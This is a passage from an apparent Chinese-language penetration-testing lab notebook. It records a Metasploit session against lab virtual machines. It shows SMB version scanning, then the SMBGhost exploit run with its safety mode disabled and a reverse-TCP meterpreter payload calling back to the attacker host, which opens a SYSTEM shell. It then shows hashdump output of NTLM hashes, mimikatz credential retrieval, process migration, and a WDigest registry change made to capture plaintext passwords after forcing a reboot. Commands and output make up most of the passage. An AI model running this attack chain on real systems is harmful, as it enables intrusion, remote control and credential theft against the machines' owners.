+4184                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s TokenBroker
+4200                running             dllhost.exe         C:\Windows\system32\/Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
+4572                running             svchost.exe         C:\Windows\system32\-k LocalService -p -s CDPSvc
+4632                running             svchost.exe                                                 
+4744                running             msdtc.exe           C:\Windows\System32\                    
+4816                running             svchost.exe         C:\Windows\System32\-k LocalSystemNetworkRestricted -p -s StorSvc
+4924                running             explorer.exe        C:\Windows\                             
+4968                running             svchost.exe         C:\Windows\System32\-k LocalSystemNetworkRestricted -p -s TabletInputService
+5004                running             ctfmon.exe                                                  
+5048                running             MicrosoftEdge.exe   C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\-ServerName:MicrosoftEdge.AppXdnhjhccw3zf0j06tkg3jtqr00qdm0khc.mca
+5296                running             ChsIME.exe          C:\Windows\System32\InputMethod\CHS\-Embedding          
+5412                running             svchost.exe         C:\Windows\system32\-k ClipboardSvcGroup -p -s cbdhsvc
+5424                running             svchost.exe                                                 
+5616                running             ApplicationFrameHost.exeC:\Windows\system32\-Embedding          
+5708                running             StartMenuExperienceHost.exeC:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\-ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
+5724                running             SgrmBroker.exe                                              
+5780                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s gpsvc
+5824                running             dllhost.exe         C:\Windows\system32\/Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}
+5828                running             RuntimeBroker.exe   C:\Windows\System32\-Embedding          
+5872                running             WinStore.App.exe    C:\Program Files\WindowsApps\Microsoft.WindowsStore_11811.1001.18.0_x64__8wekyb3d8bbwe\-ServerName:App.AppXc75wvwned5vhz4xyxxecvgdjhdkgsdza.mca
+5880                running             RuntimeBroker.exe   C:\Windows\System32\-Embedding          
+5900                running             mmc.exe             C:\Windows\system32\"C:\Windows\system32\services.msc"
+5960                running             svchost.exe         C:\Windows\system32\-k UnistackSvcGroup 
+5972                running             OneDrive.exe        C:\Users\tyza66\AppData\Local\Microsoft\OneDrive\/background         
+6024                running             SearchUI.exe        C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\-ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
+6140                running             RuntimeBroker.exe   C:\Windows\System32\-Embedding          
+6176                running             SkypeBackgroundHost.exeC:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\-ServerName:SkypeBackgroundHost
+6196                running             SkypeApp.exe        C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\-ServerName:App.AppXffn3yxqvgawq9fpmnhy90fr3y01d1t5b.mca
+6392                running             SearchIndexer.exe   C:\Windows\system32\/Embedding          
+6400                running             browser_broker.exe  C:\Windows\system32\-Embedding          
+6560                running             RuntimeBroker.exe   C:\Windows\System32\-Embedding          
+6616                running             MicrosoftEdgeSH.exe C:\Windows\system32\SCODEF:5048 CREDAT:9730 APH:1000000000000004 JITHOST /prefetch:2
+6644                running             MicrosoftEdgeCP.exe C:\Windows\System32\-ServerName:Windows.Internal.WebRuntime.ContentProcessServer
+6796                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s wuauserv
+7124                running             WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.eC:\Windows\SystemApps\InputApp_cw5n1h2txyewy\-ServerName:App.AppXagta193n5rpf7mheremt3yyfa1g555vc.mca
+7332                running             MsMpEng.exe                                                 
+7380                running             MpDefenderCoreService.exe                                        
+7404                running             RuntimeBroker.exe   C:\Windows\System32\-Embedding          
+7480                running             svchost.exe         C:\Windows\system32\-k LocalSystemNetworkRestricted -p -s PcaSvc
+7544                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s Appinfo
+7636                running             ChsIME.exe          C:\Windows\System32\InputMethod\CHS\-Embedding          
+7816                running             powershell.exe      C:\Windows\System32\WindowsPowerShell\v1.0\                    
+7824                running             conhost.exe         \??\C:\Windows\system32\0x4                 
+7988                running             SecurityHealthSystray.exeC:\Windows\System32\                    
+8016                running             SecurityHealthService.exe                                        
+8108                running             vmtoolsd.exe        C:\Program Files\VMware\VMware Tools\-n vmusr            
+8136                running             WmiPrvSE.exe        C:\Windows\system32\wbem\                    
+
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+会发现我们获得的信息非常的多
+包括联系人 地址 网络接口 网段 路由信息 网段 网关 子网信息 开放端口信息 网络 硬盘 设备 软件 服务 正在运行哪些进程 等等
+
+
+接下来用SMB协议获得一下主机信息
+SMB就是服务器消息块 就是网络文件共享协议(CIFS)
+445
+
+首先去win10里面打开网络文件共享开关(上下都开)
+回kali扫描开启状态
+msf6 auxiliary(scanner/snmp/snmp_enum) > use auxiliary/
+Display all 1248 possibilities? (y or n)
+use auxiliary/admin/2wire/xslt_password_reset
+use auxiliary/admin/android/google_play_store_uxss_xframe_rce
+use auxiliary/admin/appletv/appletv_display_image
+use auxiliary/admin/appletv/appletv_display_video
+use auxiliary/admin/atg/atg_client
+use auxiliary/admin/aws/aws_launch_instances
+use auxiliary/admin/backupexec/dump
+use auxiliary/admin/backupexec/registry
+use auxiliary/admin/chromecast/chromecast_reset
+use auxiliary/admin/chromecast/chromecast_youtube
+use auxiliary/admin/citrix/citrix_netscaler_config_decrypt
+use auxiliary/admin/db2/db2rcmd
+use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
+use auxiliary/admin/dcerpc/cve_2022_26923_certifried
+use auxiliary/admin/dcerpc/icpr_cert
+use auxiliary/admin/dcerpc/samr_computer
+use auxiliary/admin/dns/dyn_dns_update
+use auxiliary/admin/edirectory/edirectory_dhost_cookie
+use auxiliary/admin/edirectory/edirectory_edirutil
+use auxiliary/admin/emc/alphastor_devicemanager_exec
+use auxiliary/admin/emc/alphastor_librarymanager_exec
+use auxiliary/admin/firetv/firetv_youtube
+use auxiliary/admin/hp/hp_data_protector_cmd
+use auxiliary/admin/hp/hp_ilo_create_admin_account
+use auxiliary/admin/hp/hp_imc_som_create_account
+use auxiliary/admin/http/allegro_rompager_auth_bypass
+msf6 auxiliary(scanner/snmp/snmp_enum) > use auxiliary/scanner/
+Display all 628 possibilities? (y or n)
+use auxiliary/scanner/acpp/login
+use auxiliary/scanner/afp/afp_login
+use auxiliary/scanner/afp/afp_server_info
+use auxiliary/scanner/amqp/amqp_login
+use auxiliary/scanner/amqp/amqp_version
+use auxiliary/scanner/backdoor/energizer_duo_detect
+use auxiliary/scanner/chargen/chargen_probe
+use auxiliary/scanner/couchdb/couchdb_enum
+use auxiliary/scanner/couchdb/couchdb_login
+use auxiliary/scanner/db2/db2_auth
+use auxiliary/scanner/db2/db2_version
+use auxiliary/scanner/db2/discovery
+use auxiliary/scanner/dcerpc/dfscoerce
+use auxiliary/scanner/dcerpc/endpoint_mapper
+use auxiliary/scanner/dcerpc/hidden
+use auxiliary/scanner/dcerpc/management
+use auxiliary/scanner/dcerpc/petitpotam
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+use auxiliary/scanner/dcerpc/windows_deployment_services
+use auxiliary/scanner/dect/call_scanner
+use auxiliary/scanner/dect/station_scanner
+use auxiliary/scanner/discovery/arp_sweep
+use auxiliary/scanner/discovery/empty_udp
+use auxiliary/scanner/discovery/ipv6_multicast_ping
+use auxiliary/scanner/discovery/ipv6_neighbor
+use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement
+msf6 auxiliary(scanner/snmp/snmp_enum) > use auxiliary/scanner/smb/
+use auxiliary/scanner/smb/impacket/dcomexec
+use auxiliary/scanner/smb/impacket/secretsdump
+use auxiliary/scanner/smb/impacket/wmiexec
+use auxiliary/scanner/smb/pipe_auditor
+use auxiliary/scanner/smb/pipe_dcerpc_auditor
+use auxiliary/scanner/smb/psexec_loggedin_users
+use auxiliary/scanner/smb/smb_enum_gpp
+use auxiliary/scanner/smb/smb_enumshares
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumusers_domain
+use auxiliary/scanner/smb/smb_login
+use auxiliary/scanner/smb/smb_lookupsid
+use auxiliary/scanner/smb/smb_ms17_010
+use auxiliary/scanner/smb/smb_uninit_cred
+use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/snmp/snmp_enum) > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.
+                                       com/docs/using-metasploit/basics/using-metasploi
+                                       t.html
+   RPORT                     no        The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads (max one per ho
+                                       st)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > set Rhosts 192.168.101.180
+Rhosts => 192.168.101.180
+msf6 auxiliary(scanner/smb/smb_version) > options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   192.168.101.180  yes       The target host(s), see https://docs.metasploit.
+                                       com/docs/using-metasploit/basics/using-metasploi
+                                       t.html
+   RPORT                     no        The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads (max one per ho
+                                       st)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > set Rhosts 192.168.101.180, 192.168.101.111
+Rhosts => 192.168.101.180, 192.168.101.111
+msf6 auxiliary(scanner/smb/smb_version) > options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting          Required  Description
+   ----     ---------------          --------  -----------
+   RHOSTS   192.168.101.180, 192.16  yes       The target host(s), see https://docs.met
+            8.101.111                          asploit.com/docs/using-metasploit/basics
+                                               /using-metasploit.html
+   RPORT                             no        The target port (TCP)
+   THREADS  1                        yes       The number of concurrent threads (max on
+                                               e per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+[*] 192.168.101.180:445   - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{00000000-0000-0000-0000-000000000000}) (authentication domain:METASPLOITABLE3-UB1404)
+[*] 192.168.101.180:445   -   Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] 192.168.101.111:445   - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-GCM) (signatures:optional) (guid:{b4fa1531-517f-4f2f-bdef-ac91d60be7a3}) (authentication domain:DESKTOP-ASI6V22)
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+内容有Smb版本号 在linux里面文件共享使用的是Samba 看这个版本
+Windows上看SMB
+拿到版本号之后就可以去终端里面搜索相关漏洞
+┌──(root💀tyza66)-[~]
+└─# searchsploit SMB 3.1.1
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+Microsoft Windows 10 (1903/1909) - 'SMBGho | windows/dos/48216.md
+Microsoft Windows 10 (1903/1909) - 'SMBGho | windows/local/48267.txt
+MikroTik RouterOS < 6.41.3/6.42rc27 - SMB  | hardware/remote/44290.py
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+之后我们可以进行获取用户哈希值和明文密码 哈希值指的是密码的哈希
+win7 和xp很容易获得
+win10以上的时候只能拿到哈希值了 但是可以通过修改注册表抓明文(需要用户重启)
+
+我们还是利用永恒之黑登录用户之后进行操作
+
+┌──(root💀tyza66)-[~]
+└─# use exploit/windows/smb/cve_2020_0796_smbghost
+找不到命令 “use”，您的意思是：
+  “ase” 命令来自 Debian 软件包 ase
+  “nse” 命令来自 Debian 软件包 ns2
+  “muse” 命令来自 Debian 软件包 muse
+  “us” 命令来自 Debian 软件包 unicornscan
+尝试 apt install <deb name>
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# msfdb run         
+[i] Database already started
+Metasploit tip: Use the edit command to open the currently active module 
+in your editor
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+use exploit/windows/smb/cve_2020_0796_smbghost
+msf6 > use exploit/windows/smb/cve_2020_0796_smbghost
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set rhosts 192.168.101.111rhosts => 192.168.101.111
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) >  set payload
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > windows/x64/meterpreter/reverse_tcp
+[-] Unknown command: windows/x64/meterpreter/reverse_tcp. Run the help command for more details.
+This is a module we can load. Do you want to use windows/x64/meterpreter/reverse_tcp? [y/N]   n
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) >  set payload
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set LHOST 192.168.101.53
+LHOST => 192.168.101.53
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.111:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.111:445 - The service is running, but could not be validated.
+[-] 192.168.101.111:445 - Exploit aborted due to failure: bad-config: 
+
+Are you SURE you want to execute this module? There is a high probability that even when the exploit is
+successful the remote target will crash within about 90 minutes.
+
+Disable the DefangedMode option to proceed.
+
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.111:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.111:445 - The service is running, but could not be validated.
+[-] 192.168.101.111:445 - Exploit aborted due to failure: bad-config: 
+
+Are you SURE you want to execute this module? There is a high probability that even when the exploit is
+successful the remote target will crash within about 90 minutes.
+
+Disable the DefangedMode option to proceed.
+
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set DefangedMode false
+DefangedMode => false
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.111:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.111:445 - The service is running, but could not be validated.
+[*] 192.168.101.111:445 - Found low stub at physical address 0x0000000000014000, virtual address 0xfffff7f90000f000
+[*] 192.168.101.111:445 - Found PML4 at 0x00000000001ad000 (UEFI)
+[*] 192.168.101.111:445 - Found HAL heap at 0xfffff7f900000000
+[*] 192.168.101.111:445 - Found PML4 self-reference entry at 0x0100
+[*] 192.168.101.111:445 - Found hal!HalpInterruptController at 0xfffff7f900001490
+[*] 192.168.101.111:445 - Found hal!HalpApicRequestInterrupt at 0xfffff8075d6b7bb0
+[*] 192.168.101.111:445 - KUSER_SHARED_DATA PTE NX bit cleared!
+
+
+[*] 192.168.101.111:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
+[-] 192.168.101.111:445 - Exploit failed: The connection with (192.168.101.111:445) timed out.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > 
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > 
+msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] 192.168.101.111:445 - Running automatic check ("set AutoCheck false" to disable)
+[!] 192.168.101.111:445 - The service is running, but could not be validated.
+[*] 192.168.101.111:445 - Found low stub at physical address 0x0000000000014000, virtual address 0xfffff7a0c000f000
+[*] 192.168.101.111:445 - Found PML4 at 0x00000000001ad000 (UEFI)
+[*] 192.168.101.111:445 - Found HAL heap at 0xfffff7a0c0000000
+[*] 192.168.101.111:445 - Found PML4 self-reference entry at 0x0116
+[*] 192.168.101.111:445 - Found hal!HalpInterruptController at 0xfffff7a0c0001490
+[*] 192.168.101.111:445 - Found hal!HalpApicRequestInterrupt at 0xfffff80473eb7bb0
+[*] 192.168.101.111:445 - KUSER_SHARED_DATA PTE NX bit cleared!
+[*] Sending stage (201798 bytes) to 192.168.101.111
+[*] Meterpreter session 1 opened (192.168.101.53:4444 -> 192.168.101.111:49715) at 2025-02-17 09:33:39 +0800
+[*] 192.168.101.111:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
+
+meterpreter > 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > hashdump
+admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+tyza66:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:83cdde6544e3feb235d3cfdc61104914:::
+meterpreter > 
+
+拿到的哈希有两段分别是lm哈希和ntml哈希
+我们只要破解ntml哈希
+可以用mimikatz抓取 它是一个内网渗透神器
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+使用它需要系统权限
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background
+                               thread
+    channel                   Displays information or control active channe
+                              ls
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/http
+                              s)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current
+                               session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the
+                               session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the se
+                              ssion
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establ
+                              ish session
+    ssl_verify                Modify the SSL certificate verification setti
+                              ng
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias for lpwd
+                              )
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to the scre
+                              en
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    show_mount                List all mount points/logical drives
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    getproxy                  Display the current proxy configuration
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    netstat                   Display the network connections
+    portfwd                   Forward a local port to a remote service
+    resolve                   Resolve a set of host names on the target
+    route                     View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    clearev                   Clear the event log
+    drop_token                Relinquishes any active impersonation token.
+    execute                   Execute a command
+    getenv                    Get one or more environment variable values
+    getpid                    Get the current process identifier
+    getprivs                  Attempt to enable all privileges available to
+                               the current process
+    getsid                    Get the SID of the user that the server is ru
+                              nning as
+    getuid                    Get the user that the server is running as
+    kill                      Terminate a process
+    localtime                 Displays the target system local date and tim
+                              e
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    reboot                    Reboots the remote computer
+    reg                       Modify and interact with the remote registry
+    rev2self                  Calls RevertToSelf() on the remote machine
+    shell                     Drop into a system command shell
+    shutdown                  Shuts down the remote computer
+    steal_token               Attempts to steal an impersonation token from
+                               the target process
+    suspend                   Suspends or resumes a list of processes
+    sysinfo                   Gets information about the remote system, suc
+                              h as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command                   Description
+    -------                   -----------
+    enumdesktops              List all accessible desktops and window stati
+                              ons
+    getdesktop                Get the current meterpreter desktop
+    idletime                  Returns the number of seconds the remote user
+                               has been idle
+    keyboard_send             Send keystrokes
+    keyevent                  Send key events
+    keyscan_dump              Dump the keystroke buffer
+    keyscan_start             Start capturing keystrokes
+    keyscan_stop              Stop capturing keystrokes
+    mouse                     Send mouse events
+    screenshare               Watch the remote user desktop in real time
+    screenshot                Grab a screenshot of the interactive desktop
+    setdesktop                Change the meterpreters current desktop
+    uictl                     Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    record_mic                Record audio from the default microphone for
+                              X seconds
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the specified webcam
+    webcam_stream             Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on the targ
+                              et system
+
+
+Priv: Elevate Commands
+======================
+
+    Command                   Description
+    -------                   -----------
+    getsystem                 Attempt to elevate your privilege to that of
+                              local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command                   Description
+    -------                   -----------
+    hashdump                  Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command                   Description
+    -------                   -----------
+    timestomp                 Manipulate file MACE attributes
+
+
+Kiwi Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    creds_all                 Retrieve all credentials (parsed)
+    creds_kerberos            Retrieve Kerberos creds (parsed)
+    creds_livessp             Retrieve Live SSP creds
+    creds_msv                 Retrieve LM/NTLM creds (parsed)
+    creds_ssp                 Retrieve SSP creds
+    creds_tspkg               Retrieve TsPkg creds (parsed)
+    creds_wdigest             Retrieve WDigest creds (parsed)
+    dcsync                    Retrieve user account information via DCSync
+                              (unparsed)
+    dcsync_ntlm               Retrieve user account NTLM hash, SID and RID
+                              via DCSync
+    golden_ticket_create      Create a golden kerberos ticket
+    kerberos_ticket_list      List all kerberos tickets (unparsed)
+    kerberos_ticket_purge     Purge any in-use kerberos tickets
+    kerberos_ticket_use       Use a kerberos ticket
+    kiwi_cmd                  Execute an arbitrary mimikatz command (unpars
+                              ed)
+    lsa_dump_sam              Dump LSA SAM (unparsed)
+    lsa_dump_secrets          Dump LSA secrets (unparsed)
+    password_change           Change the password/hash of a user
+    wifi_list                 List wifi profiles/creds for the current user
+    wifi_list_shared          List shared wifi profiles/creds (requires SYS
+                              TEM)
+
+For more info on a specific command, use <command> -h or help <command>.
+
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain           NTLM                     SHA1
+--------  ------           ----                     ----
+tyza66    DESKTOP-ASI6V22  31d6cfe0d16ae931b73c59d  da39a3ee5e6b4b0d3255bfe
+                           7e0c089c0                f95601890afd80709
+
+wdigest credentials
+===================
+
+Username          Domain           Password
+--------          ------           --------
+(null)            (null)           (null)
+DESKTOP-ASI6V22$  WORKGROUP        (null)
+tyza66            DESKTOP-ASI6V22  (null)
+
+kerberos credentials
+====================
+
+Username          Domain           Password
+--------          ------           --------
+(null)            (null)           (null)
+desktop-asi6v22$  WORKGROUP        (null)
+tyza66            DESKTOP-ASI6V22  (null)
+
+我们要修改对方的注册表 首先要进行一个进程迁移 
+先查一下目标机器登录的是哪个用户
+meterpreter > ps -S explorer
+Filtering on 'explorer'
+
+Process List
+============
+
+ PID   PPID  Name        Arch  Session  User              Path
+ ---   ----  ----        ----  -------  ----              ----
+ 4972  4948  explorer.e  x64   1        DESKTOP-ASI6V22\  C:\Windows\explor
+             xe                         tyza66            er.exe
+
+然后把当前的会话进程迁移到pid上
+meterpreter > migrate 4972
+[*] Migrating from 2184 to 4972...
+[*] Migration completed successfully.
+
+把当前的进程迁移到他的进程上
+meterpreter > getuid
+Server username: DESKTOP-ASI6V22\tyza66
+如果我想获得键盘或者屏幕就必须要迁移到当前用户 不能在system操作
+如果想回去就迁移回去就行了
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+meterpreter > migrate 4972
+[*] Migrating from 2184 to 4972...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: DESKTOP-ASI6V22\tyza66
+meterpreter > shell
+Process 3748 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.18362.476]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>exit 
+exit
+meterpreter >  reg add
+Usage: reg [command] [options]
+Interact with the target machine's registry.
+
+OPTIONS:
+
+    -d   The data to store in the registry value.
+    -h   Help menu.
+    -k   The registry key path (E.g. HKLM\Software\Foo).
+    -r   The remote machine name to connect to (with current process credentials
+    -t   The registry value type (E.g. REG_SZ).
+    -v   The registry value name (E.g. Stuff).
+    -w   Set KEY_WOW64 flag, valid values [32|64].
+COMMANDS:
+
+    enumkey     Enumerate the supplied registry key [-k <key>]
+    createkey   Create the supplied registry key  [-k <key>]
+    deletekey   Delete the supplied registry key  [-k <key>]
+    queryclass  Queries the class of the supplied key [-k <key>]
+    setval      Set a registry value [-k <key> -v <val> -d <data>]. Use a binary blob to set binary data with REG_BINARY type (e.g. setval -d ef4ba278)
+    deleteval   Delete the supplied registry value [-k <key> -v <val>]
+    queryval    Queries the data contents of a value [-k <key> -v <val>]
+
+meterpreter > HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v
+[-] Unknown command: HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest. Run the help command for more details.
+meterpreter > shell
+Process 8124 created.
+Channel 2 created.
+Microsoft Windows [�汾 10.0.18362.476]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+����: �����ʡ�
+
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\system32>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+ERROR: Access is denied.
+
+这里我提示权限不足 因为我tyza66这个用户没权限 得改一下权限
+永恒之黑拿到权限，不进行进程迁移，直接去修改
+meterpreter > shell
+Process 6780 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.18362.476]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\system32>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+The operation completed successfully.
+
+之后让用户强制重启
+meterpreter > shell
+Process 8172 created.
+Channel 1 created.
